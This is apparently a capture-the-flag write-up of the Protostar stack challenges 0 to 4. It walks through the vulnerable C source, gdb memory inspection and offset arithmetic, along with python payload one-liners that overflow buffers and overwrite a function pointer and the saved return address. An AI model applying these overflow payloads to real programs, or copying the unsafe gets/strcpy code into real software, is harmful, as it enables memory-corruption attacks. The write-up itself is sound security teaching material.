# Writeup Protostar2: Stack

## Stack0

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
    volatile int modified;
    char buffer[64];
    modified = 0;
    gets(buffer);

    if(modified != 0) {
        printf("you have changed the 'modified' variable\n");
    } else {
        printf("Try again?\n");
    }
}
```

`volatile` is a keyword in C indicating that this variable can change anytime  
by outside the code and is omitted from compiler optimization.

```
0x080483fd <main+9>:    mov    DWORD PTR [esp+0x5c],0x0
0x08048405 <main+17>:   lea    eax,[esp+0x1c]
0x08048409 <main+21>:   mov    DWORD PTR [esp],eax
0x0804840c <main+24>:   call   0x804830c <gets@plt>
0x08048411 <main+29>:   mov    eax,DWORD PTR [esp+0x5c]
0x08048415 <main+33>:   test   eax,eax
```

The integer `modified` is at `[esp+0x5c]` and is assigned to 0.  
Our buffer is right above it starting at `[esp+0x1c]`. We can easily verify the size:

```bash
(gdb) print 0x5c-0x1c
$1 = 64
```

A pointer to our buffer is 'pushed' onto the stack. After the call to `gets` the value of `modified` is checked against 0. The `gets` function has no boundery checks so we can write more than 64 bytes into the buffer and land in our modified variable. Every value besides 0 would evalute to true so writing 1 more byte into the buffer would set the least significant byte (because of the endianess) and would print the winning message.

```
(gdb) x/d $esp+0x5c
0xbffff69c:     2
(gdb) x/xw $esp+0x5c
0xbffff69c:     0x00000002
(gdb) x/5xb $esp+0x5b
0xbffff69b:     0x41    0x02    0x00    0x00    0x00

user@protostar:/opt/protostar/bin$ python -c "print '\x41' * 64 + '\x02'" | ./stack0
you have changed the 'modified' variable
```

**Note:**

The print function appends a new line character `0xa` at the end.  
To avoid this we can use `sys.stdout.write()`:

```bash
user@protostar:/opt/protostar/bin$ python -c "print '\x41' * 3" | hexdump -C
00000000  41 41 41 0a                                       |AAA.|
00000004
user@protostar:/opt/protostar/bin$ python -c "import sys; sys.stdout.write('\x41' * 3)" | hexdump -C
00000000  41 41 41                                          |AAA|
00000003
```

**Resources:**

https://linux-audit.com/linux-aslr-and-kernelrandomize_va_space-setting/  
https://docs.python.org/2/library/sys.html#sys.stdout

## Stack1

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

This time we can specify user-defined input as an input parameter to `stack1`.  
The program uses the unsafe function `strcpy`. The man pages already warns us:

> The strings may not overlap, and the destination string dest must be large enough
> to receive the copy.  Beware of buffer overruns!  (See BUGS.)

This time we have to overwrite `modified` with `0x61626364`.  
The Intel x86 processors use the little-endian format where the least significant byte is stored at the lowest memory address. So `0x61626364` is actually saved as `0x64 0x63 0x62 0x61`. We can use the python's `struct` module to get the correct byte order and dump the bytes like this:

```python
#!/usr/bin/env python3

import struct

data = struct.pack('<I', 0x61626364)
data = ''.join('\\x{:02X}'.format(a) for a in data)
print(data)

# \x64\x63\x62\x61
```

Now we can simply craft another input string:

```
$ python -c "import sys; sys.stdout.buffer.write(b'\x41' * 64 + b'\x64\x63\x62\x61')" | xxd
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000020: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000030: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000040: 6463 6261                                dcba
```

We can directly input it as an argument to gdb's `run` command:

```bash
(gdb) run $(python -c "import sys; sys.stdout.write(b'\x41' * 64 + b'\x64\x63\x62\x61')")
Starting program: /opt/protostar/bin/stack1 $(python -c "import sys; sys.stdout.write(b'\x41' * 64 + b'\x64\x63\x62\x61')")
you have correctly got the variable to the right value
```

## Stack2

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

This time we can control the input via an environment variable. We can set an environment variable via `export`. We can use `printenv` to make sure that the variable is set correctly and that it is an environment variable and not a shell variable. Shell variables won't work here.

```bash
$ export GREENIE=$(python -c "import sys; sys.stdout.write(b'\x41' * 64 + b'\x0A\x0D\x0A\x0D')")
$ printenv GREENIE
$ ./stack2
$ you have correctly modified the variable
```

## Stack3

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

There are multiple ways of course to get the address of the `win` function.  
In the following I will present four different ones:

Obtain function address via `nm`
```bash
user@protostar:/opt/protostar/bin$ nm -a ./stack3 | grep win
08048424 T win
```

Use `objdump` the get the address
```bash
user@protostar:/opt/protostar/bin$ objdump -Fd ./stack3 | grep win
08048424 <win> (File Offset: 0x424):
```

If we only have the offset we can calculate the address ourself. We just have to add the offet to the base address of the module:
> module's base address + function offset = function address

```bash
user@protostar:/opt/protostar/bin$ readelf -l ./stack3 | grep LOAD
  LOAD           0x000000 0x08048000 0x08048000 0x00594 0x00594 R E 0x1000
  LOAD           0x000594 0x08049594 0x08049594 0x00110 0x00118 RW  0x1000

# 0x0804800 + 0x424 = 0x08048424
```

We can also use gdb to get the address
```bash
user@protostar:/opt/protostar/bin$ gdb -q ./stack3
Reading symbols from /opt/protostar/bin/stack3...done.
(gdb) break main
Breakpoint 1 at 0x8048441: file stack3/stack3.c, line 16.
(gdb) run
Starting program: /opt/protostar/bin/stack3

Breakpoint 1, main (argc=1, argv=0xbffff824) at stack3/stack3.c:16
16      stack3/stack3.c: No such file or directory.
        in stack3/stack3.c
(gdb) info proc mapping
process 3645
cmdline = '/opt/protostar/bin/stack3'
cwd = '/opt/protostar/bin'
exe = '/opt/protostar/bin/stack3'
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack3
         0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack3
        0xb7e96000 0xb7e97000     0x1000          0
        0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
        0xb7fd9000 0xb7fdc000     0x3000          0
        0xb7fe0000 0xb7fe2000     0x2000          0
        0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
        0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
        0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
        0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
        0xbffeb000 0xc0000000    0x15000          0           [stack]
(gdb) print win
$1 = {void (void)} 0x8048424 <win>
```

The rest is the same as in previous challenges. Append the address to our payload pass it to stdin
```bash
user@protostar:/opt/protostar/bin$ python -c "print '\x41' * 64 + '\x24\x84\x04\x08'" | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
```

## Stack4

```c
nclude <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

This time we have to overwrite EIP to control the program flow after the main function returns.  
After the function prologue gcc aligns the stack by rounding down to the nearest multiple of 16. We have to take this into consideration when we calculate the size of our payload!

```asm
0x08048408 <main+0>:    push   ebp
0x08048409 <main+1>:    mov    ebp,esp
0x0804840b <main+3>:    and    esp,0xfffffff0 ; stack alignment
0x0804840e <main+6>:    sub    esp,0x50       ; reserve space on stack
```

So after this the stack looks like this. The penultimate address `0xbffff7f8` is the EBP of the old stack frame and `0xb7eadc76` is the return address we want to overwrite.
```bash
(gdb) x/24xw $esp
0xbffff720:     0xb7fd7ff4      0xb7ec6165      0xbffff738      0xb7eada75
0xbffff730:     0xb7fd7ff4      0x080495ec      0xbffff748      0x080482e8
0xbffff740:     0xb7ff1040      0x080495ec      0xbffff778      0x08048449
0xbffff750:     0xb7fd8304      0xb7fd7ff4      0x08048430      0xbffff778
0xbffff760:     0xb7ec6365      0xb7ff1040      0x0804843b      0xb7fd7ff4
0xbffff770:     0x08048430      0x00000000      0xbffff7f8      0xb7eadc76
```

To calculate the required bytes to reach EIP we have to do some math. We store old EBP (`+4`). Then we do some stack alignment (`+8`). We allocate some space on the stack (`+80`) but our buffer starts at `ESP+0x10` (`-16`).
```
80 - 16 + 8 (alignment) + 4 (old EBP) = 76
```

Here is how the stack looks like
```
.--------------------.
|  saved EIP         |
.--------------------.
|  saved EBP         |
.--------------------.
|  8 byte alignment  | ; and esp, 0xfffffff0
.--------------------.  
|                    | ; sub esp, 0x50 (80)
|                    | 
|  buffer[64]        | 
|                    | 
|                    | 
|                    | 
.--------------------. <- ESP+0x10
|  16 bytes          | 
.--------------------. <- ESP
```

So 76 bytes padding are required before we land at EIP. EIP itself is replaced with the address of the `win` function. 
```bash
$ objdump -Fd ./stack4 | grep win
080483f4 <win> (File Offset: 0x3f4):
$ python -c "import sys; sys.stdout.write('A' * 76 + '\xF4\x83\x04\x08')" > /tmp/stack4_input
$ gdb -q ./stack4
Reading symbols from /opt/protostar/bin/stack4...done.
(gdb) run < /tmp/stack4_input
Starting program: /opt/protostar/bin/stack4 < /tmp/stack4_input
code flow successfully changed

Program received signal SIGSEGV, Segmentation fault.
0x00000000 in ?? ()
(gdb)
```
